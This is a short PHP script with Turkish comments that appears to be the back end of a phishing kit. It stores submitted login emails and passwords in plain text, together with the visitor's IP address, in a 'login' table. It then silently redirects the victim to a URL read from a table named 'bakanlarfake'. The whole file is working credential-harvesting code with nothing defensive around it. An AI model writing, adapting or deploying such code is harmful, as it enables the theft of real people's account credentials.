<?php  
require_once 'config.php';
$userbilgi=$cek['m_user'];
$eposta=$_POST['Log_eposta'];
$sifre=$_POST['Log_Sifre'];



//İP Adresi Fonksiyonu
//---------------------------------------------------
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
{
// Ziyaretçi internete direk mi bağlanıyor?
	$ipadresi = $_SERVER["HTTP_CLIENT_IP"];
}
elseif(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
{
// Ziyaretçi Proxy sunucu mu kullanıyor?
	$ipadresi = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
else
{
	$ipadresi = $_SERVER["REMOTE_ADDR"];
}
//---------------------------------------------------


   $veritabani="bakanlarfake"; 
   $verism="BF_link"; 
	$Kaydet=$Db->prepare("INSERT INTO login SET 
		Log_eposta=:Log_eposta,
		Log_ip=:ipadresi,
		Log_Sifre=:Log_Sifre
		");


$insert=$Kaydet->execute(array(

	'Log_eposta' => $_POST['Log_eposta'],
	'ipadresi' => $ipadresi,
	'Log_Sifre' => $_POST['Log_Sifre']

	));







$listele=$Db->prepare("SELECT * from  $veritabani");
$listele->execute();
$cek=$listele->fetch(PDO::FETCH_ASSOC);


if ($insert)
{
	function yon($link,$sre)
	{
	if($sre!="")
	{
	header("refresh:".$sre.";url=".$link."");
}
else
{
	header("url=".$link."");
}
}
yon($cek[$verism],"0");

}


?>